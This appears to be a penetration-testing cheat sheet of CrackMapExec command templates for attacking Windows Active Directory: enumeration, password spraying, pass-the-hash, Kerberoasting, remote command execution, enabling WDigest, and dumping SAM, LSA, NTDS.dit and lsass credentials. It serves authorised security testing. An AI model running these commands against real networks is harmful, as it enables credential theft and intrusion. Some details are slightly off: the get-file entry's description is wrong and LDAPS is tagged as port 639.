# cme

% cme, crackmapexec, windows, Active directory

## cme - enumerate hosts, network
#platform/linux #target/remote #port/445 #protocol/smb #cat/RECON
Example : cme smb 192.168.1.0/24

https://mpgn.gitbook.io/crackmapexec/

```bash
cme smb <target_ip>
```

## cme - enumerate password policy
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

```bash
cme smb <target_ip> -u <user> -p '<password>' --pass-pol
```

## cme - enumerate null session
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
cme smb <target_ip> -u '' -p ''
```

## cme - enumerate anonymous login
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
cme smb <target_ip> -u 'a' -p ''
```

## cme - enumerate active sessions
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <target_ip> -u <user> -p '<password>' --sessions
```

## cme - enumerate domain users
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <target_ip> -u <user> -p '<password>' --users
```

## cme - enumerate users by bruteforce the RID
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <target_ip> -u <user> -p '<password>' --rid-brute
```

## cme - enumerate domain groups
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <target_ip> -u <user> -p '<password>' --groups
```

## cme - enumerate local groups
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <target_ip> -u <user> -p '<password>' --local-groups
```

## cme - enumerate shares
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

Enumerate permissions on all shares

```bash
cme smb <target_ip> -u <user> -p <password> -d <domain> --shares
```

## cme - enumerate disks
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

Enumerate disks on the remote target

```bash
cme smb <target_ip> -u <user> -p '<password>' --disks
```

## cme - enumerate smb target not signed
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

Maps the network of live hosts and saves a list of only the hosts that  don't require SMB signing. List format is one IP per line

```bash
cme smb <target_ip> --gen-relay-list smb_targets.txt
```

## cme - enumerate logged users
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <target_ip> -u <user> -p '<password>' --loggedon-users
```

## cme - enable wdigest
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT  #warning/modify_target 

enable/disable the WDigest provider and dump clear-text credentials from LSA memory.

```bash
cme smb <target_ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable
```

## cme - loggout user
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT

Can be useful after enable wdigest to force user to reconnect

```bash
cme smb <target_ip> -u <user> -p '<password>' -x 'quser'
cme smb <target_ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output
```

## cme - local-auth
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
cme smb <target_ip> -u <user> -p <password> --local-auth
```

## cme - local-auth with hash
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

```bash
cme smb <target_ip> -u <user> -H <hash> --local-auth
```

## cme - domain auth
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
cme smb <target_ip> -u <user> -p <password> -d <domain>
```

## cme - kerberos auth
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

Previously import ticket : 
export KRB5CCNAME=/tmp/ticket.ccache

```bash
cme smb <target_ip> --kerberos
```

## cme - Dump SAM
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump SAM hashes using methods from secretsdump.py
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

```bash
cme smb <target_ip> -u <user> -p <password> -d <domain> --sam
```

## cme - Dump LSA
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump LSA secrets using methods from secretsdump.py
Requires Domain Admin or Local Admin Privileges on target Domain Controller

```bash
cme smb <target_ip> -u <user> -p <password> -d <domain> --lsa
```

## cme - dump ntds.dit
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump the NTDS.dit from target DC using methods from secretsdump.py
Requires Domain Admin or Local Admin Privileges on target Domain Controller

```bash
cme smb <target_ip> -u <user> -p <password> -d <domain> --ntds
```

## cme - dump lsass
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
cme smb <target_ip> -u <user> -p <password> -d <domain> -M lsassy
```

## cme - dump lsass - with bloodhond update
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
cme smb <target_ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
```

## cme - password spray (user=password)
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY 

```bash
cme smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
```

## cme - password spray multiple test 
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY #tag/warning

(carrefull on lockout)

```bash
cme smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success
```

## cme - put file
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
Send a local file to the remote target

```bash
cme smb <target_ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
```

## cme - get file
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
Send a local file to the remote target

```bash
cme smb <target_ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
```

## cme - ASREPRoast enum without authentication
#platform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

User can be a wordlist too (user.txt)
Hashcat format  -m 18200 

```bash
cme ldap <target_ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_ip>
```

## cme - ASREPRoast enum with authentication
#platform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON  

Hashcat format  -m 18200 

```bash
cme ldap <target_ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_ip>
```

## cme - Kerberoasting
#platform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

Hashcat format  -m 13100

```bash
cme ldap <target_ip> -u <user> -p '<password>' --kerberoasting kerberoastables.txt --kdcHost <dc_ip>
```

## cme - Unconstrained delegation
#platform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

List of all computers et users with the flag TRUSTED_FOR_DELEGATION

```bash
cme ldap <target_ip> -u <user> -p '<password>' --trusted-for-delegation
```

## cme - winrm-auth
#platform/linux #target/remote #port/5985 #port/5986 #protocol/winrm #cat/ATTACK/CONNECT  

```bash
cme winrm <target_ip> -u <user> -p <password>
```

## cme - mssql password spray
#platform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/BRUTEFORCE-SPRAY  

```bash
cme mssql <target_ip> -u <user.txt> -p <password.txt>  --no-bruteforce
```

## cme - mssql execute query
#platform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/EXPLOIT 

```bash
cme mssql <target_ip> -u <user> -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

## cme - mssql execute command
#platform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/EXPLOIT 

```bash
cme mssql <target_ip> -u <user> -p '<password>' --local-auth -x <cmd|whoami>
```

## cme - disable restricted admin mode to be able to pass the hash via RDP
```bash
cme smb <target_ip> -u <user> -H <nthash> -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```